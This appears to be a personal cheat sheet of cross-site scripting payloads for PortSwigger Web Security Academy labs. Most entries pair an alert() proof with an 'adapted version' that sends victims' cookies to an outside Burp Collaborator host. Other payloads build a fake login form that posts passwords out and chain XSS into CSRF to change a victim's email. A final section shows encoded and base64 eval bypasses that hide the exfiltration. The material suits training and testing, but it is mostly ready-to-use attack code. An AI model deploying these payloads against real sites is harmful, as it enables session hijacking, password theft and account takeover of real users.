____

### 1. DOM XSS in document.write sink using source location.search inside a select element.
>Add parameter to URL product?productId=1&storeId=kek and check out it is in dropbox on the product site. Check HTML code and find out, that storeId is in select tag. Create the next payload:  
```js
storeId=kek"></select><script>alert(1)</script>
```
**Adapted version**
```js
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```


### 2. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded.  
```js
{{constructor.constructor('alert(1)')()}}
```
**Adapted version**
```js
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

### 3. Reflected DOM XSS
```js
\"-alert()}//
```
**Adapted version**
```js
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

### 4. Stored DOM XSS
>Function replaces first angle brakets only:
```js
<><img src=1 onerror=alert(1)>
```
**Adapted version**
```js
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```

### 5. Exploiting cross-site scripting to steal cookies
```js
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

### 6. Exploiting cross-site scripting to capture passwords
>You can create new form in comment section to steal passwords
```js
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
>https://www.doyler.net/security-not-included/xss-password-stealing  
>https://medium.com/dark-roast-security/password-stealing-from-https-login-page-and-csrf-bypass-with-reflected-xss-76f56ebc4516


### 7. Exploiting XSS to perform CSRF
>There is protection against CSRF, so we need to use the other user's CSRF token in our payload
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```

### 8. Reflected XSS into HTML context with most tags and attributes blocked
>BruteForce all tags by using portswigger list: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
>Find out, that *body onresize="print()"* payload gives 200 status. Use the next payload, to send it to victim:

```js
<iframe src="https://0a61001b0306cecac0be0a5000570086.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
**Adapted version**
```js
<script>
location = 'https://kek.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?c='+document.cookie tabindex=1>#x';
</script>

ULR Encoded:

<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```

### 9. Reflected XSS into HTML context with all tags blocked except custom ones
>All tags are blocked, but you can provide your own (e.g. xss). Use the next payload, to send it to victim:
```js
<script>
location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```
**Adapted version**
```js
<xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x

ULR Encoded:

%3Cxss%20id=x%20onfocus=document.location=%22http://burp.oastify.com/?c=%22+document.cookie%20tabindex=1%3E#x
```

### 10. Reflected XSS with some SVG markup allowed
```js
<svg><animatetransform onbegin=alert(1)> 
```
**Adapted version**
```js
<svg><animatetransform onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;>

URL Encoded:

%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;%3E
```


### 11. Reflected XSS in canonical link tag
```js
'accesskey='x'onclick='alert(1)
```


### 12. Reflected XSS into a JavaScript string with single quote and backslash escaped
```js
</script><script>alert(1)</script>
```
**Adapted version**
```
</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
```


### 13. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
```js
\';alert(1);//
\'-alert(1)//
```
**Adapted version**
```
\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//
```


### 14. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
```js
http://foo?&apos;-alert(1)-&apos;
```


### 15. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
```js
${alert(1)}
```


## Some Useful Bypasses
```js
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```
```
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```
```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
